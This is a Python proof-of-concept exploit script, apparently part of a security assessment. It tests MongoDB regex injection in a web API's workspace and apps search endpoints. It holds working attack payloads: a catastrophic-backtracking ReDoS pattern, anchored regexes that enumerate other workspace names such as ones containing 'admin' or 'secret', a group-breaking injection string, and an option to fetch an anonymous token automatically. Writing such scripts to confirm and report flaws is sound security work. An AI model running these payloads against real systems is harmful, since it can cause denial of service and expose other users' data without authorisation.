#!/usr/bin/env python3
"""
PoC #12 — MongoDB Regex Injection in Workspace Search
HIGH: User-supplied name/search passed directly to $regex without escaping.

Tests: ReDoS, workspace enumeration via regex anchoring.

Usage: python3 poc_12_mongodb_regex_injection.py --target https://dev.example.com --token AUTH_TOKEN
"""

import argparse
import requests
import json
import time
import urllib3
urllib3.disable_warnings()


def test_redos(base_url, token):
    """Send a catastrophic backtracking regex to cause ReDoS."""
    print("\n[*] Test 1: ReDoS via $regex injection...")

    url = f"{base_url}/v2/workspaces"
    headers = {"Authorization": f"Bearer {token}"}

    # Catastrophic backtracking pattern
    # When matched against a string of 'a's, this causes exponential backtracking
    redos_payload = "(a+)+$"

    params = {"name": redos_payload}

    start = time.time()
    try:
        r = requests.get(url, headers=headers, params=params, verify=False, timeout=30)
        elapsed = time.time() - start
        print(f"  Status: {r.status_code}, Time: {elapsed:.2f}s")
        if elapsed > 5:
            print(f"  [HIGH] Response took {elapsed:.2f}s — ReDoS likely!")
            return True
        else:
            print(f"  [INFO] Responded in {elapsed:.2f}s")
    except requests.exceptions.Timeout:
        elapsed = time.time() - start
        print(f"  [HIGH] Request timed out after {elapsed:.2f}s — ReDoS confirmed!")
        return True
    except Exception as e:
        print(f"  [ERROR] {e}")
    return False


def test_workspace_enumeration(base_url, token):
    """Use regex anchoring to enumerate workspace names character by character."""
    print("\n[*] Test 2: Workspace name enumeration via regex...")

    url = f"{base_url}/v2/workspaces"
    headers = {"Authorization": f"Bearer {token}"}

    # Test if regex metacharacters are interpreted
    test_patterns = [
        ("^a", "Starts with 'a'"),
        ("^[a-z]", "Starts with lowercase letter"),
        ("^.$", "Exactly 1 character"),
        ("^.{1,5}$", "1-5 characters long"),
        (".*admin.*", "Contains 'admin'"),
        (".*secret.*", "Contains 'secret'"),
        (".*test.*", "Contains 'test'"),
        (".*prod.*", "Contains 'prod'"),
    ]

    found_patterns = []
    for pattern, desc in test_patterns:
        params = {"name": pattern}
        try:
            r = requests.get(url, headers=headers, params=params, verify=False, timeout=10)
            if r.status_code == 200:
                data = r.json()
                results = data if isinstance(data, list) else data.get("results", [])
                count = len(results) if isinstance(results, list) else 0
                if count > 0:
                    names = [w.get("name", "?") for w in results[:3]] if isinstance(results, list) else []
                    print(f"  [{pattern}] ({desc}): {count} matches — {names}")
                    found_patterns.append(pattern)
        except Exception as e:
            print(f"  [ERROR] {pattern}: {e}")

    if found_patterns:
        print(f"\n  [HIGH] Regex patterns interpreted — {len(found_patterns)} patterns matched!")
        return True
    return False


def test_search_param_regex(base_url, token):
    """Test the search parameter which also uses $regex."""
    print("\n[*] Test 3: Regex injection via 'search' parameter...")

    url = f"{base_url}/v2/workspaces"
    headers = {"Authorization": f"Bearer {token}"}

    # The search param does: `.*${search.replace(/\s/g, '.*')}.*`
    # Only whitespace is replaced — all other metacharacters pass through
    params = {"search": ")|.*("}  # Breaks out of the regex group

    try:
        r = requests.get(url, headers=headers, params=params, verify=False, timeout=10)
        print(f"  Status: {r.status_code}")
        if r.status_code == 500:
            print(f"  [HIGH] Server error — regex injection caused invalid regex!")
            print(f"  Response: {r.text[:300]}")
            return True
        elif r.status_code == 200:
            data = r.json()
            results = data if isinstance(data, list) else data.get("results", [])
            count = len(results) if isinstance(results, list) else "?"
            print(f"  [INFO] Returned {count} results (regex may have been interpreted)")
            return True
        else:
            print(f"  Response: {r.text[:300]}")
    except Exception as e:
        print(f"  [ERROR] {e}")
    return False


def test_apps_regex(base_url, token):
    """Test regex injection in apps search (same pattern)."""
    print("\n[*] Test 4: Regex injection in apps search...")

    url = f"{base_url}/v2/apps"
    headers = {"Authorization": f"Bearer {token}"}
    params = {"text": ".*"}  # Match all

    try:
        r = requests.get(url, headers=headers, params=params, verify=False, timeout=10)
        print(f"  Status: {r.status_code}")
        if r.status_code == 200:
            data = r.json()
            results = data if isinstance(data, list) else data.get("results", [])
            count = len(results) if isinstance(results, list) else "?"
            print(f"  [HIGH] Regex '.*' accepted — returned {count} results")
            return True
        else:
            print(f"  Response: {r.text[:200]}")
    except Exception as e:
        print(f"  [ERROR] {e}")
    return False


def main():
    parser = argparse.ArgumentParser(description="PoC #12: MongoDB Regex Injection")
    parser.add_argument("--target", required=True, help="Base URL")
    parser.add_argument("--token", default="", help="Bearer token (optional with auto-auth)")
    args = parser.parse_args()

    if not args.token:
        from auth_helper import get_anonymous_token
        print("[*] No token provided — obtaining anonymous auth token...")
        token, user_id, _ = get_anonymous_token(args.target)
        if token:
            args.token = token
            print(f"[+] Anonymous token obtained! User ID: {user_id}")
        else:
            print("[-] Failed to get anonymous token. Provide --token manually.")
            return


    base = args.target.rstrip("/")
    print(f"[*] Target: {base}")
    print("=" * 60)

    results = {}
    results["redos"] = test_redos(base, args.token)
    results["enumeration"] = test_workspace_enumeration(base, args.token)
    results["search_regex"] = test_search_param_regex(base, args.token)
    results["apps_regex"] = test_apps_regex(base, args.token)

    print("\n" + "=" * 60)
    print("[*] SUMMARY")
    for k, v in results.items():
        print(f"  {k}: {'VULNERABLE' if v else 'NOT VULNERABLE'}")


if __name__ == "__main__":
    main()
